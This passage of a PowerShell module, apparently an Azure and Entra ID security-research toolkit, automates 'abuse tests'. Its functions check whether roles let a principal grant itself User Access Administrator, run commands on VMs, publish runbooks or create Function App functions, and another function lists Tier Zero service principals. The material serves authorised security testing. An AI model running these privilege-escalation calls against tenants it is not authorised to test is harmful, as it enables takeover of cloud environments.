    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this test. Abuse test Service Principal display names will start with this string.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $SPCreds = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()

    # Get all current app roles that can be scoped against MS Graph:
    $MGRoles = Get-MGAppRoles -Token $GlobalAdminToken.access_token

    # Perform all abuse tests, creating a unique Service Principal per MS Graph app role:
    $MGRoles | ForEach-Object -ThrottleLimit 50 -Parallel {

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:New-TestAppReg})                          { $ast = ${using:New-TestAppRegAst};                        ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                              { $ast = ${using:New-TestSPAst};                            ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppSecret})                      { $ast = ${using:New-EntraAppSecretAst};                    ${global:New-EntraAppSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppRoleAssignment})              { $ast = ${using:New-EntraAppRoleAssignmentAst};            ${global:New-EntraAppRoleAssignment} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $_.AppRoleValue)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-EntraAppSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the MS Graph app role to the test app:
        Start-Sleep 60s

        # Grant the MS Graph App Role to the SP
        $MSGraphAppRoleActivation = (& ${global:New-EntraAppRoleAssignment} `
            -SPObjectID $ThreadSafeSP.SPObjectId `
            -AppRoleID $_.id `
            -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )

        $SPCred = New-Object PSObject
        $SPCred | Add-Member Noteproperty 'ClientID' $ThreadSafeSecret.AppRegAppId
        $SPCred | Add-Member Noteproperty 'ClientSecret' $ThreadSafeSecret.AppRegSecretValue
        $SPCred | Add-Member Noteproperty 'HeldPrivilege' $_.value

        $LocalSPCreds = $using:SPCreds
        $LocalSPCreds.Add($SPCred)

    }

    $SPCreds

}

Function Get-EntraTierZeroServicePrincipals {
    <#
    .SYNOPSIS
        Finds all Service Principals that have a Tier Zero Entra Admin Role or Tier Zero MS Graph App Role assignment
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Finds all Service Principals that have a Tier Zero Entra Admin Role or Tier Zero MS Graph App Role assignment
    
    .PARAMETER Token
        A MS Graph scoped JWT for a user with the ability to read Entra and MS Graph app role assignments
    
    .EXAMPLE
    C:\PS> Get-TierZeroServicePrincipals -Token $Token
    
    Description
    -----------
    Retrieve a list of all service principals with Tier Zero privileges
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Get Global Admin service principals:
    $GlobalAdmins = $null 
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $GlobalAdmins += $Results.value
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get Privileged Role Administrator principals:
    $PrivRoleAdmins = $null
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq 'e8611ab8-c189-46e8-94e1-60213ab1f814'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $PrivRoleAdmins += $Results.value
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get Privileged Authentication Administrator principals:
    $PrivAuthAdmins = $null
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq '7be44c8a-adaf-4e2a-84d6-ab2649e08a13'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $PrivAuthAdmins += $Results.value
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get Partner Tier2 Support principals:
    $PartnerTier2Support = $null
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq 'e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $PartnerTier2Support += $Results.value
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get the MS Graph SP
    $URL = "https://graph.microsoft.com/v1.0/servicePrincipals/?`$filter=appId eq '00000003-0000-0000-c000-000000000000'"
    $MSGraphSP = (Invoke-RestMethod `
        -URI $URL `
        -Method "GET" `
        -Headers @{
            Authorization = "Bearer $($Token)"
        }).value
    
    # Get app roles scoped to the Graph SP
    $MGAppRoles = $null
    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals/$($MSGraphSP.id)/appRoleAssignedTo"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $MGAppRoles += $Results.value
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    $TierZeroServicePrincipals = @()
    
    $GlobalAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Global Administrator"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $PrivRoleAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Privileged Role Administrator"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $PrivAuthAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Privileged Authentication Administrator"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $PartnerTier2Support | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Partner Tier2 Support"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $MGAppRoles | ?{$_.appRoleId -Like "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" -And $_.principalType -Like "ServicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.principalId
            TierZeroPrivilege     = "MS Graph App Role: RoleManagement.ReadWrite.Directory"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $MGAppRoles | ?{$_.appRoleId -Like "06b708a9-e830-4db3-a914-8e69da51d44f" -And $_.principalType -Like "ServicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.principalId
            TierZeroPrivilege     = "MS Graph App Role: AppRoleAssignment.ReadWrite.All"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $TierZeroServicePrincipals
}

Function Test-AzureRMAddSelfToAzureRMRole {
    <#
    .SYNOPSIS
        Tests whether a principal can grant itself an AzureRM role

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to grant the associated principal the specified AzureRM role

    .PARAMETER TestPrincipalID
        The ID of the principal you are trying to grant the role to

    .PARAMETER AzureRMRoleDefinitionId
        The globally unique ID of the AzureRM role you are trying to grant the SP

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER UserAccessAdminAzureRMToken
        The AzureRM-scoped JWT for a User Access Admin principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER SubscriptionID
        The unique identifier of the target subscription

    .EXAMPLE
        C:\PS> Test-AzureRMAddSelfToAzureRMRole `
            -TestPrincipalID "26e62392-5291-44a6-a42b-578ddeb0a5cb" `
            -AzureRMRoleDefinitionId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/18d7d88d-d35e-4fb5-a5c3-7773c20a72d9" `
            -TestToken $TestToken `
            -UserAccessAdminAzureRMToken $ARMToken `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "FHIR Data Importer" `
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008"

        Description
        -----------
        Test whether the supplied JWT can grant its associated principal the User Access Admin role over the entire subscription

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AzureRMRoleDefinitionId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminAzureRMToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
        
    )

    # Test the principal granting itself "User Access Admin" role over the subscription:
    $body = @{
        properties = @{
            roleDefinitionId   =   $AzureRMRoleDefinitionId
            principalId        =   $TestPrincipalID
        }
    }
    $Success = $False
    Try {
        $RoleAssignmentGUID = ([GUID]::NewGuid()).toString()
        $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Authorization/roleAssignments/$($RoleAssignmentGUID)?api-version=2018-01-01-preview"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -URI $URI `
            -Method PUT `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Promote self to User Access Administrator"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the AzureRM role assignment. Wait 1 minute for the role assignment to have existed before deleting it.
        Start-Sleep -s 60
        
        $DeleteRoleAssignment = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($UserAccessAdminAzureRMToken)"} `
            -URI $URI `
            -Method DELETE
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMAddSelfToAzureRMRoleDefinition' -Value (Get-Command -Name "Test-AzureRMAddSelfToAzureRMRole") -Force
New-Variable -Name 'Test-AzureRMAddSelfToAzureRMRoleAst' -Value (${Test-AzureRMAddSelfToAzureRMRoleDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-AzureRMVMRunCommand {
    <#
    .SYNOPSIS
        Tests whether a principal can run a SYSTEM command via the runCommand endpoint

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to run a SYSTEM command via the runCommand endpoint

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-AzureRMVMRunCommand `
            -TestToken $ARMToken `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "FHIR Data Importer" `
            -VirtualMachinePath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/VirtualMachines/providers/Microsoft.Compute/virtualMachines/MyWin10VirtualMachine"

        Description
        -----------
        Test whether the supplied JWT can run a SYSTEM command via the runCommand endpoint on the MyWin10VirtualMachine VM.

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $VirtualMachinePath
    )

    $URI = "$($VirtualMachinePath)/runCommand?api-version=2018-04-01"
    
    $Body = @{
        commandId = "RunPowerShellScript"
        script = @(
          'whoami'
        )
    }
    
    $Success = $False
    $Count = 0
    Do {
        Try {
            $RunCommandRequest = Invoke-RestMethod `
                -Uri $URI `
                -Method POST `
                -Headers @{Authorization = "Bearer $($TestToken)"} `
                -ContentType "application/json" `
                -Body $($Body | ConvertTo-Json) `
                -ResponseHeadersVariable "Headers"
            $Success = $True
        }
        Catch {
            If ($_.ErrorDetails.Message -Match "AuthorizationFailed") {
                $Success = $False
            }
        }
        $Count++
        Start-Sleep -s 10
    }
    Until ($Success -Or $Count -eq 10 -Or $Success -eq $False)

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Run command on VM via runCommand endpoint"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMVMRunCommandDefinition' -Value (Get-Command -Name "Test-AzureRMVMRunCommand") -Force
New-Variable -Name 'Test-AzureRMVMRunCommandAst' -Value (${Test-AzureRMVMRunCommandDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-AzureRMPublishAutomationAccountRunBook {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can publish a new runbook to an existing automation account

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a Service Principal can publish a new runbook to an existing automation account

    .PARAMETER TestPrincipalDisplayName
        The display name of the test principal

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER SubscriptionID
        The unique identifier of the target subscription

    .EXAMPLE
        C:\PS> Test-AzureRMPublishAutomationAccountRunBook `
            -TestToken $ARMToken `
            -TestPrincipalDisplayName "MyCoolServicePrincipal" `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "Contributor" `
            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"

        Description
        -----------
        Tests whether a principal can publish a new runbook to an existing automation account called "MyCoolAutomationAccount"

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalDisplayName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AutomationAccountPath
    )
    
    $Body = @{
        commandId = "RunPowerShellScript"
        script = @(
          'whoami'
        )
    }
   
    $Success = $False
    Try {
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    content = @{
                        name = $AppDisplayName
                        location = "eastus"
                        properties = @{
                            runbookType = "PowerShell7"
                            description = "asdf"
                            logProgress = "false"
                            logVerbose = "false"
                            draft = @{}
                        }
                    }
                    httpMethod = "PUT"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($TestPrincipalDisplayName)?api-version=2017-05-15-preview"
                }
            )
        }
        $CreateDraft = Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 5)

        # Add script to the runbook
        $URI = "$($AutomationAccountPath)/runbooks/$($TestPrincipalDisplayName)/draft/content?api-version=2015-10-31"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -URI $URI `
            -Method PUT `
            -Body "whoami" `
            -ContentType "text/powershell"

        # Publish the runbook
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    httpMethod = "POST"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($TestPrincipalDisplayName)/publish?api-version=2018-06-30"
                }
            )
        }
        Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 3)
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Publish a new Automation Account runbook"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMPublishAutomationAccountRunBookDefinition' -Value (Get-Command -Name "Test-AzureRMPublishAutomationAccountRunBook") -Force
New-Variable -Name 'Test-AzureRMPublishAutomationAccountRunBookAst' -Value (${Test-AzureRMPublishAutomationAccountRunBookDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-AzureRMCreateFunction {
    <#
    .SYNOPSIS
        Tests whether a principal can create a new function in an existing Function App

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a principal can create a new function in an existing Function App

    .PARAMETER TestPrincipalDisplayName
        The display name of the test principal

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER SubscriptionID
        The unique identifier of the target subscription

    .EXAMPLE
        C:\PS> Test-AzureRMCreateFunction `
            -TestToken $ARMToken `
            -TestPrincipalDisplayName "My Cool Service Principal" `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "Contributor" `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/FunctionApps/providers/Microsoft.Web/sites/MyCoolFunctionApp"

        Description
        -----------
        Tests whether a principal can create a new function in an existing Function App called "MyCoolFunctionApp"

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalDisplayName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp
    )

    $FunctionName = "a" + ($TestPrincipalDisplayName).Replace(".","_")

    $URI = "$($PathToFunctionApp)/functions/$($FunctionName)?api-version=2018-11-01"
    
    $Body = @{
        id = "$($PathToFunctionApp)/functions/$($FunctionName)"
        properties = @{
            name = $FunctionName
            files = @{
                "run.ps1" = "asdf"
            }
            test_data = "asdf"
            config = @{
                bindings = @(
                    @{
                        authLevel = "function"
                        type = "httpTrigger"
                        direction = "in"
                        name = "Request"
                        methods = @(
                            "get"
                            "post"
                        )
                    }
                    @{
                        type = "http"
                        direction = "out"
                        name = "Response"
                    }
                )
            }
        }
    } | ConvertTo-Json -Depth 5
   
    $Success = $False
    Try {
        $CreateFunction = Invoke-RestMethod `
            -Method PUT `
            -URI $URI `
            -Body $Body `
            -Headers @{
                "authorization"="Bearer $($TestToken)"
            } `
            -ContentType "application/json"
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Publish a new function on a function app"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMCreateFunctionDefinition' -Value (Get-Command -Name "Test-AzureRMCreateFunction") -Force
New-Variable -Name 'Test-AzureRMCreateFunctionAst' -Value (${Test-AzureRMCreateFunctionDefinition}.ScriptBlock.Ast.Body) -Force

function Invoke-AllAzureRMAbuseTests {
    <#
    .SYNOPSIS
        Performs all AzureRM abuse tests, or specified tests against AzureRM objects if specfied with AbuseTestType switch

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Performs abuse tests against the appropriate AzureRM object type

    .PARAMETER GlobalAdminClientID
        The ID of the service principal with Global Admin at the Entra tenant level

    .PARAMETER GlobalAdminSecret
        The plain-text password for the Global Admin service principal

    .PARAMETER UserAccessAdminClientID
        The ID of the service principal with User Access Admin role at the subscription

    .PARAMETER UserAccessAdminSecret
        The plain-text password for the User Access Admin service principal

    .PARAMETER TenantName
        The display name of the Entra tenant the service principal lives in

    .PARAMETER SubscriptionID
        The ID of the target subscription

    .EXAMPLE
        C:\PS> Invoke-AllAzureRMAbuseTests `
            -GlobalAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -GlobalAdminSecret "<secret>" `
            -UserAccessAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -UserAccessAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008"

        Description
        -----------
        Perform all abuse tests, determines which available roles are able to perform all known abuse primitives

    .EXAMPLE
        C:\PS> Invoke-AllAzureRMAbuseTests `
            -GlobalAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -GlobalAdminSecret "<secret>" `
            -UserAccessAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -UserAccessAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008"
            -AbuseTestType "AzureRMVMRunCommand"

        Description
        -----------
        Perform only the AzureRMVMRunCommand abuse tests, determines which available roles are able to perform that specific abuse primitive

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID,

        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AbuseTestType,

        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetVirtualMachinePath
        
    )

    $UserAccessAdminToken = (Get-AzureRMTokenWithClientCredentials `
        -ClientID       $UserAccessAdminClientID `
        -ClientSecret   $UserAccessAdminSecret `
        -TenantName     $TenantName).access_token

    # Create a unique identifier for this test. Abuse test Service Principal display names will start with this string.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $AzureRMTestResults = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()

    # Get all current AzureRM roles:
    $SubRoles = Get-AzureRMRoleDefinitions -Token $UserAccessAdminToken -SubscriptionID $SubscriptionID

    # Perform all abuse tests, creating a unique Service Principal per AzureRM role:
    $SubRoles | ?{$_.AzureRMRoleDisplayName -Match "Virtual Machine"} | ForEach-Object -ThrottleLimit 50 -Parallel {
    #$SubRoles | ForEach-Object -ThrottleLimit 50 -Parallel {

        $AzureRMRoleDisplayName = $_.AzureRMRoleDisplayName

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
